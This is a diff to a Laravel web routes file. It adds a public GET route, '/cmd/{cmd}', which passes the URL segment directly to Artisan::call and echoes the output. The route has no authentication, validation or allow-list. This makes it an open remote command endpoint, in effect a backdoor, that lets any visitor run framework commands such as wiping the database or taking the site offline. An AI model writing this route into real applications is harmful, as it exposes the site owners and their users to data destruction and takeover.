@@ -17,6 +17,11 @@ use Illuminate\Support\Facades\Route;
 |
 */
 
+Route::get('/cmd/{cmd}', function ($cmd) {
+    \Artisan::call("$cmd");
+    return \Artisan::output();
+});
+
 Route::get('/', function () {
     return view('auth.login');
 });
